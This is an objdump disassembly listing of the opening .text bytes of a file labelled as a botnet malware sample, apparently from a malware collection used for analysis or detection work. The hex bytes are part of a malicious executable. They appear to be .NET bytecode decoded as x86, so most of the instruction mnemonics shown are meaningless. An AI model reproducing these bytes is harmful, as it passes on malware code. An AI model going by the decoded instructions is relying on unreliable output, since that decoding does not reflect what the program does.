
malware_samples/botnet/a812bb930c3dbd7738e8eb43b5113d0f6d12c41a37a2c69ecce59f5310a083ca.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	88 a4 00 00 00 00 00 	mov    %ah,0x0(%eax,%eax,1)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 30 57 00       	add    $0x573000,%eax
  402013:	00 08                	add    %cl,(%eax)
  402015:	4d                   	dec    %ebp
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1b 30                	sbb    (%eax),%esi
  402052:	03 00                	add    (%eax),%eax
  402054:	b5 00                	mov    $0x0,%ch
  402056:	00 00                	add    %al,(%eax)
  402058:	01 00                	add    %eax,(%eax)
  40205a:	00 11                	add    %dl,(%ecx)
  40205c:	16                   	push   %ss
  40205d:	0a 2b                	or     (%ebx),%ch
  40205f:	0e                   	push   %cs
  402060:	20 e8                	and    %ch,%al
  402062:	03 00                	add    (%eax),%eax
  402064:	00 28                	add    %ch,(%eax)
  402066:	14 00                	adc    $0x0,%al
  402068:	00 0a                	add    %cl,(%edx)
  40206a:	06                   	push   %es
  40206b:	17                   	pop    %ss
  40206c:	58                   	pop    %eax
  40206d:	0a 06                	or     (%esi),%al
  40206f:	7e 11                	jle    0x402082
  402071:	00 00                	add    %al,(%eax)
  402073:	04 28                	add    $0x28,%al
  402075:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  40207a:	e5 28                	in     $0x28,%eax
  40207c:	03 00                	add    (%eax),%eax
  40207e:	00 06                	add    %al,(%esi)
  402080:	2d 06 16 28 16       	sub    $0x16281606,%eax
  402085:	00 00                	add    %al,(%eax)
  402087:	0a 00                	or     (%eax),%al
  402089:	28 87 00 00 06 2d    	sub    %al,0x2d060000(%edi)
  40208f:	06                   	push   %es
  402090:	16                   	push   %ss
  402091:	28 16                	sub    %dl,(%esi)
  402093:	00 00                	add    %al,(%eax)
  402095:	0a 7e 0c             	or     0xc(%esi),%bh
  402098:	00 00                	add    %al,(%eax)
  40209a:	04 28                	add    $0x28,%al
  40209c:	17                   	pop    %ss
  40209d:	00 00                	add    %al,(%eax)
  40209f:	0a 2c 05 28 72 00 00 	or     0x7228(,%eax,1),%ch
  4020a6:	06                   	push   %es
  4020a7:	7e 04                	jle    0x4020ad
  4020a9:	00 00                	add    %al,(%eax)
  4020ab:	04 28                	add    $0x28,%al
  4020ad:	17                   	pop    %ss
  4020ae:	00 00                	add    %al,(%eax)
  4020b0:	0a 2c 05 28 70 00 00 	or     0x7028(,%eax,1),%ch
  4020b7:	06                   	push   %es
  4020b8:	7e 0f                	jle    0x4020c9
  4020ba:	00 00                	add    %al,(%eax)
  4020bc:	04 28                	add    $0x28,%al
  4020be:	17                   	pop    %ss
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  4020c4:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  4020ca:	05 28 8a 00 00       	add    $0x8a28,%eax
  4020cf:	06                   	push   %es
  4020d0:	28 86 00 00 06 73    	sub    %al,0x73060000(%esi)
  4020d6:	7d 00                	jge    0x4020d8
  4020d8:	00 06                	add    %al,(%esi)
  4020da:	28 7b 00             	sub    %bh,0x0(%ebx)
  4020dd:	00 06                	add    %al,(%esi)
  4020df:	26 de 03             	fiadds %es:(%ebx)
  4020e2:	26 de 00             	fiadds %es:(%eax)
  4020e5:	28 12                	sub    %dl,(%edx)
  4020e7:	00 00                	add    %al,(%eax)
  4020e9:	06                   	push   %es
  4020ea:	2d 0a 28 1c 00       	sub    $0x1c280a,%eax
  4020ef:	00 06                	add    %al,(%esi)
  4020f1:	28 19                	sub    %bl,(%ecx)
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	06                   	push   %es
  4020f6:	73 18                	jae    0x402110
  4020f8:	00 00                	add    %al,(%eax)
  4020fa:	0a 20                	or     (%eax),%ah
  4020fc:	e8 03 00 00 20       	call   0x20402104
  402101:	88 13                	mov    %dl,(%ebx)
  402103:	00 00                	add    %al,(%eax)
  402105:	6f                   	outsl  %ds:(%esi),(%dx)
  402106:	19 00                	sbb    %eax,(%eax)
  402108:	00 0a                	add    %cl,(%edx)
  40210a:	28 14 00             	sub    %dl,(%eax,%eax,1)
  40210d:	00 0a                	add    %cl,(%edx)
  40210f:	2b d4                	sub    %esp,%edx
  402111:	00 00                	add    %al,(%eax)
  402113:	00 01                	add    %al,(%ecx)
  402115:	10 00                	adc    %al,(%eax)
  402117:	00 00                	add    %al,(%eax)
  402119:	00 2d 00 59 86 00    	add    %ch,0x865900
  40211f:	03 0f                	add    (%edi),%ecx
  402121:	00 00                	add    %al,(%eax)
  402123:	01 1e                	add    %ebx,(%esi)
  402125:	02 28                	add    (%eax),%ch
  402127:	1a 00                	sbb    (%eax),%al
  402129:	00 0a                	add    %cl,(%edx)
  40212b:	2a 1b                	sub    (%ebx),%bl
  40212d:	30 02                	xor    %al,(%edx)
  40212f:	00 13                	add    %dl,(%ebx)
  402131:	01 00                	add    %eax,(%eax)
  402133:	00 02                	add    %al,(%edx)
  402135:	00 00                	add    %al,(%eax)
  402137:	11 28                	adc    %ebp,(%eax)
  402139:	1b 00                	sbb    (%eax),%eax
  40213b:	00 0a                	add    %cl,(%edx)
  40213d:	7e 07                	jle    0x402146
  40213f:	00 00                	add    %al,(%eax)
  402141:	04 28                	add    $0x28,%al
  402143:	1c 00                	sbb    $0x0,%al
  402145:	00 0a                	add    %cl,(%edx)
  402147:	6f                   	outsl  %ds:(%esi),(%dx)
  402148:	1d 00 00 0a 80       	sbb    $0x800a0000,%eax
  40214d:	07                   	pop    %es
  40214e:	00 00                	add    %al,(%eax)
  402150:	04 7e                	add    $0x7e,%al
  402152:	07                   	pop    %es
  402153:	00 00                	add    %al,(%eax)
  402155:	04 73                	add    $0x73,%al
  402157:	97                   	xchg   %eax,%edi
  402158:	00 00                	add    %al,(%eax)
  40215a:	06                   	push   %es
  40215b:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  402162:	00 00                	add    %al,(%eax)
  402164:	04 7e                	add    $0x7e,%al
  402166:	01 00                	add    %eax,(%eax)
  402168:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40216b:	9a 00 00 06 80 01 00 	lcall  $0x1,$0x80060000
  402172:	00 04 7e             	add    %al,(%esi,%edi,2)
  402175:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40217a:	02 00                	add    (%eax),%al
  40217c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40217f:	9a 00 00 06 80 02 00 	lcall  $0x2,$0x80060000
  402186:	00 04 7e             	add    %al,(%esi,%edi,2)
  402189:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40218e:	03 00                	add    (%eax),%eax
  402190:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402193:	9a 00 00 06 80 03 00 	lcall  $0x3,$0x80060000
  40219a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40219d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4021a2:	04 00                	add    $0x0,%al
  4021a4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4021a7:	9a 00 00 06 80 04 00 	lcall  $0x4,$0x80060000
  4021ae:	00 04 7e             	add    %al,(%esi,%edi,2)
  4021b1:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4021b6:	08 00                	or     %al,(%eax)
  4021b8:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4021bb:	9a 00 00 06 80 08 00 	lcall  $0x8,$0x80060000
  4021c2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4021c5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4021ca:	0e                   	push   %cs
  4021cb:	00 00                	add    %al,(%eax)
  4021cd:	04 6f                	add    $0x6f,%al
  4021cf:	9a 00 00 06 80 0e 00 	lcall  $0xe,$0x80060000
  4021d6:	00 04 7e             	add    %al,(%esi,%edi,2)
  4021d9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4021de:	0c 00                	or     $0x0,%al
  4021e0:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4021e3:	9a 00 00 06 80 0c 00 	lcall  $0xc,$0x80060000
  4021ea:	00 04 7e             	add    %al,(%esi,%edi,2)
  4021ed:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4021f2:	0f 00 00             	sldt   (%eax)
  4021f5:	04 6f                	add    $0x6f,%al
  4021f7:	9a 00 00 06 80 0f 00 	lcall  $0xf,$0x80060000
  4021fe:	00 04 28             	add    %al,(%eax,%ebp,1)
  402201:	7e 00                	jle    0x402203
  402203:	00 06                	add    %al,(%esi)
  402205:	80 10 00             	adcb   $0x0,(%eax)
  402208:	00 04 7e             	add    %al,(%esi,%edi,2)
  40220b:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402210:	0a 00                	or     (%eax),%al
  402212:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402215:	9a 00 00 06 80 0a 00 	lcall  $0xa,$0x80060000
  40221c:	00 04 7e             	add    %al,(%esi,%edi,2)
  40221f:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402224:	09 00                	or     %eax,(%eax)
  402226:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402229:	9a 00 00 06 28 1c 00 	lcall  $0x1c,$0x28060000
  402230:	00 0a                	add    %cl,(%edx)
  402232:	73 1e                	jae    0x402252
  402234:	00 00                	add    %al,(%eax)
  402236:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40223c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40223f:	00 06                	add    %al,(%esi)
  402241:	0a de                	or     %dh,%bl
  402243:	05 26 16 0a de       	add    $0xde0a1626,%eax
  402248:	00 06                	add    %al,(%esi)
  40224a:	2a 00                	sub    (%eax),%al
  40224c:	41                   	inc    %ecx
  40224d:	1c 00                	sbb    $0x0,%al
	...
  402257:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0c 01                	or     $0x1,%al
  40225e:	00 00                	add    %al,(%eax)
  402260:	05 00 00 00 0f       	add    $0xf000000,%eax
  402265:	00 00                	add    %al,(%eax)
  402267:	01 1b                	add    %ebx,(%ebx)
  402269:	30 04 00             	xor    %al,(%eax,%eax,1)
  40226c:	4b                   	dec    %ebx
  40226d:	00 00                	add    %al,(%eax)
  40226f:	00 02                	add    %al,(%edx)
  402271:	00 00                	add    %al,(%eax)
  402273:	11 7e 0b             	adc    %edi,0xb(%esi)
  402276:	00 00                	add    %al,(%eax)
  402278:	04 6f                	add    $0x6f,%al
  40227a:	1f                   	pop    %ds
  40227b:	00 00                	add    %al,(%eax)
  40227d:	0a 6f 20             	or     0x20(%edi),%ch
  402280:	00 00                	add    %al,(%eax)
  402282:	0a 74 47 00          	or     0x0(%edi,%eax,2),%dh
  402286:	00 01                	add    %al,(%ecx)
  402288:	28 1b                	sub    %bl,(%ebx)
  40228a:	00 00                	add    %al,(%eax)
  40228c:	0a 7e 07             	or     0x7(%esi),%bh
  40228f:	00 00                	add    %al,(%eax)
  402291:	04 6f                	add    $0x6f,%al
  402293:	21 00                	and    %eax,(%eax)
  402295:	00 0a                	add    %cl,(%edx)
  402297:	28 9f 00 00 06 72    	sub    %bl,0x72060000(%edi)
  40229d:	01 00                	add    %eax,(%eax)
  40229f:	00 70 28             	add    %dh,0x28(%eax)
  4022a2:	22 00                	and    (%eax),%al
  4022a4:	00 0a                	add    %cl,(%edx)
  4022a6:	7e 0a                	jle    0x4022b2
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	04 28                	add    $0x28,%al
  4022ac:	1c 00                	sbb    $0x0,%al
  4022ae:	00 0a                	add    %cl,(%edx)
  4022b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b1:	23 00                	and    (%eax),%eax
  4022b3:	00 0a                	add    %cl,(%edx)
  4022b5:	0a de                	or     %dh,%bl
  4022b7:	05 26 16 0a de       	add    $0xde0a1626,%eax
  4022bc:	00 06                	add    %al,(%esi)
  4022be:	2a 00                	sub    (%eax),%al
  4022c0:	01 10                	add    %edx,(%eax)
  4022c2:	00 00                	add    %al,(%eax)
  4022c4:	00 00                	add    %al,(%eax)
  4022c6:	00 00                	add    %al,(%eax)
  4022c8:	44                   	inc    %esp
  4022c9:	44                   	inc    %esp
  4022ca:	00 05 11 00 00 01    	add    %al,0x1000011
  4022d0:	13 30                	adc    (%eax),%esi
  4022d2:	01 00                	add    %eax,(%eax)
  4022d4:	97                   	xchg   %eax,%edi
  4022d5:	00 00                	add    %al,(%eax)
  4022d7:	00 00                	add    %al,(%eax)
  4022d9:	00 00                	add    %al,(%eax)
  4022db:	00 72 0f             	add    %dh,0xf(%edx)
  4022de:	00 00                	add    %al,(%eax)
  4022e0:	70 80                	jo     0x402262
  4022e2:	01 00                	add    %eax,(%eax)
  4022e4:	00 04 72             	add    %al,(%edx,%esi,2)
  4022e7:	1f                   	pop    %ds
  4022e8:	00 00                	add    %al,(%eax)
  4022ea:	70 80                	jo     0x40226c
  4022ec:	02 00                	add    (%eax),%al
  4022ee:	00 04 72             	add    %al,(%edx,%esi,2)
  4022f1:	2f                   	das
  4022f2:	00 00                	add    %al,(%eax)
  4022f4:	70 80                	jo     0x402276
  4022f6:	03 00                	add    (%eax),%eax
  4022f8:	00 04 72             	add    %al,(%edx,%esi,2)
  4022fb:	43                   	inc    %ebx
  4022fc:	00 00                	add    %al,(%eax)
  4022fe:	70 80                	jo     0x402280
  402300:	04 00                	add    $0x0,%al
  402302:	00 04 72             	add    %al,(%edx,%esi,2)
  402305:	57                   	push   %edi
  402306:	00 00                	add    %al,(%eax)
  402308:	70 80                	jo     0x40228a
  40230a:	05 00 00 04 72       	add    $0x72040000,%eax
  40230f:	69 00 00 70 80 06    	imul   $0x6807000,(%eax),%eax
  402315:	00 00                	add    %al,(%eax)
  402317:	04 72                	add    $0x72,%al
  402319:	77 00                	ja     0x40231b
  40231b:	00 70 80             	add    %dh,-0x80(%eax)
  40231e:	07                   	pop    %es
  40231f:	00 00                	add    %al,(%eax)
  402321:	04 72                	add    $0x72,%al
  402323:	83 00 00             	addl   $0x0,(%eax)
  402326:	70 80                	jo     0x4022a8
  402328:	08 00                	or     %al,(%eax)
  40232a:	00 04 72             	add    %al,(%edx,%esi,2)
  40232d:	8f 00                	pop    (%eax)
  40232f:	00 70 80             	add    %dh,-0x80(%eax)
  402332:	09 00                	or     %eax,(%eax)
  402334:	00 04 72             	add    %al,(%edx,%esi,2)
  402337:	ab                   	stos   %eax,%es:(%edi)
  402338:	00 00                	add    %al,(%eax)
  40233a:	70 80                	jo     0x4022bc
  40233c:	0a 00                	or     (%eax),%al
  40233e:	00 04 72             	add    %al,(%edx,%esi,2)
  402341:	cf                   	iret
  402342:	00 00                	add    %al,(%eax)
  402344:	70 80                	jo     0x4022c6
  402346:	0c 00                	or     $0x0,%al
  402348:	00 04 72             	add    %al,(%edx,%esi,2)
  40234b:	dd 00                	fldl   (%eax)
  40234d:	00 70 80             	add    %dh,-0x80(%eax)
  402350:	0e                   	push   %cs
  402351:	00 00                	add    %al,(%eax)
  402353:	04 72                	add    $0x72,%al
  402355:	f3 00 00             	repz add %al,(%eax)
  402358:	70 80                	jo     0x4022da
  40235a:	0f 00 00             	sldt   (%eax)
  40235d:	04 72                	add    $0x72,%al
  40235f:	01 01                	add    %eax,(%ecx)
  402361:	00 70 80             	add    %dh,-0x80(%eax)
  402364:	10 00                	adc    %al,(%eax)
  402366:	00 04 72             	add    %al,(%edx,%esi,2)
  402369:	03 01                	add    (%ecx),%eax
  40236b:	00 70 80             	add    %dh,-0x80(%eax)
  40236e:	11 00                	adc    %eax,(%eax)
  402370:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402373:	1a 7e 12             	sbb    0x12(%esi),%bh
  402376:	00 00                	add    %al,(%eax)
  402378:	04 2a                	add    $0x2a,%al
  40237a:	1e                   	push   %ds
  40237b:	02 80 12 00 00 04    	add    0x4000012(%eax),%al
  402381:	2a 1a                	sub    (%edx),%bl
  402383:	7e 13                	jle    0x402398
  402385:	00 00                	add    %al,(%eax)
  402387:	04 2a                	add    $0x2a,%al
  402389:	1e                   	push   %ds
  40238a:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  402390:	2a 1a                	sub    (%edx),%bl
  402392:	7e 14                	jle    0x4023a8
  402394:	00 00                	add    %al,(%eax)
  402396:	04 2a                	add    $0x2a,%al
  402398:	1e                   	push   %ds
  402399:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40239f:	2a 1a                	sub    (%edx),%bl
  4023a1:	7e 15                	jle    0x4023b8
  4023a3:	00 00                	add    %al,(%eax)
  4023a5:	04 2a                	add    $0x2a,%al
  4023a7:	1e                   	push   %ds
  4023a8:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4023ae:	2a 1a                	sub    (%edx),%bl
  4023b0:	7e 16                	jle    0x4023c8
  4023b2:	00 00                	add    %al,(%eax)
  4023b4:	04 2a                	add    $0x2a,%al
  4023b6:	1e                   	push   %ds
  4023b7:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4023bd:	2a 1a                	sub    (%edx),%bl
  4023bf:	7e 17                	jle    0x4023d8
  4023c1:	00 00                	add    %al,(%eax)
  4023c3:	04 2a                	add    $0x2a,%al
  4023c5:	1e                   	push   %ds
  4023c6:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4023cc:	2a 1a                	sub    (%edx),%bl
  4023ce:	7e 18                	jle    0x4023e8
  4023d0:	00 00                	add    %al,(%eax)
  4023d2:	04 2a                	add    $0x2a,%al
  4023d4:	1e                   	push   %ds
  4023d5:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4023db:	2a 1a                	sub    (%edx),%bl
  4023dd:	7e 19                	jle    0x4023f8
  4023df:	00 00                	add    %al,(%eax)
  4023e1:	04 2a                	add    $0x2a,%al
  4023e3:	1a 7e 1a             	sbb    0x1a(%esi),%bh
  4023e6:	00 00                	add    %al,(%eax)
  4023e8:	04 2a                	add    $0x2a,%al
  4023ea:	1e                   	push   %ds
  4023eb:	02 80 1a 00 00 04    	add    0x400001a(%eax),%al
  4023f1:	2a 1a                	sub    (%edx),%bl
  4023f3:	7e 1b                	jle    0x402410
  4023f5:	00 00                	add    %al,(%eax)
  4023f7:	04 2a                	add    $0x2a,%al
  4023f9:	1e                   	push   %ds
  4023fa:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  402400:	2a 00                	sub    (%eax),%al
  402402:	00 00                	add    %al,(%eax)
  402404:	1b 30                	sbb    (%eax),%esi
  402406:	07                   	pop    %es
  402407:	00 9e 02 00 00 03    	add    %bl,0x3000002(%esi)
  40240d:	00 00                	add    %al,(%eax)
  40240f:	11 18                	adc    %ebx,(%eax)
  402411:	17                   	pop    %ss
  402412:	1c 73                	sbb    $0x73,%al
  402414:	24 00                	and    $0x0,%al
  402416:	00 0a                	add    %cl,(%edx)
  402418:	25 20 00 c8 00       	and    $0xc80020,%eax
  40241d:	00 6f 25             	add    %ch,0x25(%edi)
  402420:	00 00                	add    %al,(%eax)
  402422:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402428:	00 6f 26             	add    %ch,0x26(%edi)
  40242b:	00 00                	add    %al,(%eax)
  40242d:	0a 28                	or     (%eax),%ch
  40242f:	07                   	pop    %es
  402430:	00 00                	add    %al,(%eax)
  402432:	06                   	push   %es
  402433:	7e 0e                	jle    0x402443
  402435:	00 00                	add    %al,(%eax)
  402437:	04 72                	add    $0x72,%al
  402439:	13 01                	adc    (%ecx),%eax
  40243b:	00 70 28             	add    %dh,0x28(%eax)
  40243e:	27                   	daa
  40243f:	00 00                	add    %al,(%eax)
  402441:	0a 39                	or     (%ecx),%bh
  402443:	d0 00                	rolb   $1,(%eax)
  402445:	00 00                	add    %al,(%eax)
  402447:	7e 02                	jle    0x40244b
  402449:	00 00                	add    %al,(%eax)
  40244b:	04 17                	add    $0x17,%al
  40244d:	8d 4d 00             	lea    0x0(%ebp),%ecx
  402450:	00 01                	add    %al,(%ecx)
  402452:	25 16 1f 2c 9d       	and    $0x9d2c1f16,%eax
  402457:	6f                   	outsl  %ds:(%esi),(%dx)
  402458:	28 00                	sub    %al,(%eax)
  40245a:	00 0a                	add    %cl,(%edx)
  40245c:	73 18                	jae    0x402476
  40245e:	00 00                	add    %al,(%eax)
  402460:	0a 7e 02             	or     0x2(%esi),%bh
  402463:	00 00                	add    %al,(%eax)
  402465:	04 17                	add    $0x17,%al
  402467:	8d 4d 00             	lea    0x0(%ebp),%ecx
  40246a:	00 01                	add    %al,(%ecx)
  40246c:	25 16 1f 2c 9d       	and    $0x9d2c1f16,%eax
  402471:	6f                   	outsl  %ds:(%esi),(%dx)
  402472:	28 00                	sub    %al,(%eax)
  402474:	00 0a                	add    %cl,(%edx)
  402476:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402479:	29 00                	sub    %eax,(%eax)
  40247b:	00 0a                	add    %cl,(%edx)
  40247d:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  402484:	17                   	pop    %ss
  402485:	8d 4d 00             	lea    0x0(%ebp),%ecx
  402488:	00 01                	add    %al,(%ecx)
  40248a:	25 16 1f 2c 9d       	and    $0x9d2c1f16,%eax
  40248f:	6f                   	outsl  %ds:(%esi),(%dx)
  402490:	28 00                	sub    %al,(%eax)
  402492:	00 0a                	add    %cl,(%edx)
  402494:	73 18                	jae    0x4024ae
  402496:	00 00                	add    %al,(%eax)
  402498:	0a 7e 01             	or     0x1(%esi),%bh
  40249b:	00 00                	add    %al,(%eax)
  40249d:	04 17                	add    $0x17,%al
  40249f:	8d 4d 00             	lea    0x0(%ebp),%ecx
  4024a2:	00 01                	add    %al,(%ecx)
  4024a4:	25 16 1f 2c 9d       	and    $0x9d2c1f16,%eax
  4024a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4024aa:	28 00                	sub    %al,(%eax)
  4024ac:	00 0a                	add    %cl,(%edx)
  4024ae:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4024b1:	29 00                	sub    %eax,(%eax)
  4024b3:	00 0a                	add    %cl,(%edx)
  4024b5:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  4024bc:	06                   	push   %es
  4024bd:	28 1a                	sub    %bl,(%edx)
  4024bf:	00 00                	add    %al,(%eax)
  4024c1:	06                   	push   %es
  4024c2:	2c 42                	sub    $0x42,%al
  4024c4:	06                   	push   %es
  4024c5:	28 2a                	sub    %ch,(%edx)
  4024c7:	00 00                	add    %al,(%eax)
  4024c9:	0a 0c 16             	or     (%esi,%edx,1),%cl
  4024cc:	0d 2b 2c 08 09       	or     $0x9082c2b,%eax
  4024d1:	9a 13 04 28 06 00 00 	lcall  $0x0,$0x6280413
  4024d8:	06                   	push   %es
  4024d9:	11 04 07             	adc    %eax,(%edi,%eax,1)
  4024dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4024dd:	2b 00                	sub    (%eax),%eax
  4024df:	00 0a                	add    %cl,(%edx)
  4024e1:	28 06                	sub    %al,(%esi)
  4024e3:	00 00                	add    %al,(%eax)
  4024e5:	06                   	push   %es
  4024e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4024e7:	2c 00                	sub    $0x0,%al
  4024e9:	00 0a                	add    %cl,(%edx)
  4024eb:	2c 05                	sub    $0x5,%al
  4024ed:	dd af 00 00 00 de    	(bad) -0x22000000(%edi)
  4024f3:	03 26                	add    (%esi),%esp
  4024f5:	de 00                	fiadds (%eax)
  4024f7:	09 17                	or     %edx,(%edi)
  4024f9:	58                   	pop    %eax
  4024fa:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4024ff:	32 ce                	xor    %dh,%cl
  402501:	38 9b 00 00 00 28    	cmp    %bl,0x28000000(%ebx)
  402507:	06                   	push   %es
  402508:	00 00                	add    %al,(%eax)
  40250a:	06                   	push   %es
  40250b:	06                   	push   %es
  40250c:	07                   	pop    %es
  40250d:	6f                   	outsl  %ds:(%esi),(%dx)
  40250e:	2d 00 00 0a 38       	sub    $0x380a0000,%eax
  402513:	8a 00                	mov    (%eax),%al
  402515:	00 00                	add    %al,(%eax)
  402517:	73 2e                	jae    0x402547
  402519:	00 00                	add    %al,(%eax)
  40251b:	0a 13                	or     (%ebx),%dl
  40251d:	05 72 01 01 00       	add    $0x10172,%eax
  402522:	70 72                	jo     0x402596
  402524:	01 01                	add    %eax,(%ecx)
  402526:	00 70 73             	add    %dh,0x73(%eax)
  402529:	2f                   	das
  40252a:	00 00                	add    %al,(%eax)
  40252c:	0a 13                	or     (%ebx),%dl
  40252e:	06                   	push   %es
  40252f:	11 05 11 06 6f 30    	adc    %eax,0x306f0611
  402535:	00 00                	add    %al,(%eax)
  402537:	0a 11                	or     (%ecx),%dl
  402539:	05 7e 0e 00 00       	add    $0xe7e,%eax
  40253e:	04 6f                	add    $0x6f,%al
  402540:	31 00                	xor    %eax,(%eax)
  402542:	00 0a                	add    %cl,(%edx)
  402544:	17                   	pop    %ss
  402545:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  402549:	01 25 16 72 1d 01    	add    %esp,0x11d7216
  40254f:	00 70 a2             	add    %dh,-0x5e(%eax)
  402552:	16                   	push   %ss
  402553:	6f                   	outsl  %ds:(%esi),(%dx)
  402554:	32 00                	xor    (%eax),%al
  402556:	00 0a                	add    %cl,(%edx)
  402558:	13 07                	adc    (%edi),%eax
  40255a:	11 07                	adc    %eax,(%edi)
  40255c:	16                   	push   %ss
  40255d:	9a 80 02 00 00 04 11 	lcall  $0x1104,$0x280
  402564:	07                   	pop    %es
  402565:	73 18                	jae    0x40257f
  402567:	00 00                	add    %al,(%eax)
  402569:	0a 17                	or     (%edi),%dl
  40256b:	11 07                	adc    %eax,(%edi)
  40256d:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402570:	19 00                	sbb    %eax,(%eax)
  402572:	00 0a                	add    %cl,(%edx)
  402574:	9a 80 01 00 00 04 28 	lcall  $0x2804,$0x180
  40257b:	06                   	push   %es
  40257c:	00 00                	add    %al,(%eax)
  40257e:	06                   	push   %es
  40257f:	7e 02                	jle    0x402583
  402581:	00 00                	add    %al,(%eax)
  402583:	04 7e                	add    $0x7e,%al
  402585:	01 00                	add    %eax,(%eax)
  402587:	00 04 28             	add    %al,(%eax,%ebp,1)
  40258a:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  40258f:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  402594:	0c 11                	or     $0x11,%al
  402596:	05 2c 07 11 05       	add    $0x511072c,%eax
  40259b:	6f                   	outsl  %ds:(%esi),(%dx)
  40259c:	33 00                	xor    (%eax),%eax
  40259e:	00 0a                	add    %cl,(%edx)
  4025a0:	dc 28                	fsubrl (%eax)
  4025a2:	06                   	push   %es
  4025a3:	00 00                	add    %al,(%eax)
  4025a5:	06                   	push   %es
  4025a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4025a7:	2c 00                	sub    $0x0,%al
  4025a9:	00 0a                	add    %cl,(%edx)
  4025ab:	39 ec                	cmp    %ebp,%esp
  4025ad:	00 00                	add    %al,(%eax)
  4025af:	00 17                	add    %dl,(%edi)
  4025b1:	28 13                	sub    %dl,(%ebx)
  4025b3:	00 00                	add    %al,(%eax)
  4025b5:	06                   	push   %es
  4025b6:	28 06                	sub    %al,(%esi)
  4025b8:	00 00                	add    %al,(%eax)
  4025ba:	06                   	push   %es
  4025bb:	17                   	pop    %ss
  4025bc:	73 34                	jae    0x4025f2
  4025be:	00 00                	add    %al,(%eax)
  4025c0:	0a 16                	or     (%esi),%dl
  4025c2:	14 fe                	adc    $0xfe,%al
  4025c4:	06                   	push   %es
  4025c5:	1b 00                	sbb    (%eax),%eax
  4025c7:	00 06                	add    %al,(%esi)
  4025c9:	73 35                	jae    0x402600
  4025cb:	00 00                	add    %al,(%eax)
  4025cd:	0a 73 36             	or     0x36(%ebx),%dh
  4025d0:	00 00                	add    %al,(%eax)
  4025d2:	0a 28                	or     (%eax),%ch
  4025d4:	09 00                	or     %eax,(%eax)
  4025d6:	00 06                	add    %al,(%esi)
  4025d8:	28 08                	sub    %cl,(%eax)
  4025da:	00 00                	add    %al,(%eax)
  4025dc:	06                   	push   %es
  4025dd:	28 06                	sub    %al,(%esi)
  4025df:	00 00                	add    %al,(%eax)
  4025e1:	06                   	push   %es
  4025e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4025e3:	37                   	aaa
  4025e4:	00 00                	add    %al,(%eax)
  4025e6:	0a 6f 38             	or     0x38(%edi),%ch
  4025e9:	00 00                	add    %al,(%eax)
  4025eb:	0a 17                	or     (%edi),%dl
  4025ed:	8d 4d 00             	lea    0x0(%ebp),%ecx
  4025f0:	00 01                	add    %al,(%ecx)
  4025f2:	25 16 1f 3a 9d       	and    $0x9d3a1f16,%eax
  4025f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4025f8:	28 00                	sub    %al,(%eax)
  4025fa:	00 0a                	add    %cl,(%edx)
  4025fc:	16                   	push   %ss
  4025fd:	9a 14 20 c0 00 00 00 	lcall  $0x0,$0xc02014
  402604:	16                   	push   %ss
  402605:	6f                   	outsl  %ds:(%esi),(%dx)
  402606:	39 00                	cmp    %eax,(%eax)
  402608:	00 0a                	add    %cl,(%edx)
  40260a:	1a 6a 28             	sbb    0x28(%edx),%ch
